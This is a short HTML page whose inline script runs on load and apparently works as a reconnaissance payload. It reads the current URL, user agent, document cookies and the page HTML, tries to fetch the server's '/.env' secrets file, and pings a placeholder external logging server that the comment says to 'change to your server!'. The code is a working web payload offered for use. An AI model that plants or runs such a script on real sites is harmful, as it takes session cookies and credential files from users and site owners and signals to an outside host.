<body>

  <div id="output">Loading...</div>

  <script>
    (async () => {
      const output = document.getElementById('output');
      let result = "";

      // Current URL
      result += "ğŸ“ Location: " + window.location.href + "\n\n";

      // User Agent
      result += "ğŸ§  User Agent: " + navigator.userAgent + "\n\n";

      // Document cookies
      result += "ğŸª Cookies: " + document.cookie + "\n\n";

      // HTML snippet
      result += "ğŸ“„ HTML Snippet:\n" + document.documentElement.outerHTML.slice(0, 1000) + "\n\n";

      // Attempt fetch to internal file (example)
      try {
        const res = await fetch('/.env');
        const text = await res.text();
        result += `ğŸ“ /.env response (${res.status}):\n` + text.slice(0, 500) + "\n\n";
      } catch (err) {
        result += "âŒ Error fetching /.env: " + err.message + "\n\n";
      }

      // Remote ping (change to your server!)
      const pingUrl = "https://your-logging-server.example.com/ping?ua=" + encodeURIComponent(navigator.userAgent);
      const img = new Image();
      img.src = pingUrl;

      output.textContent = result;
    })();
  </script>
</body>
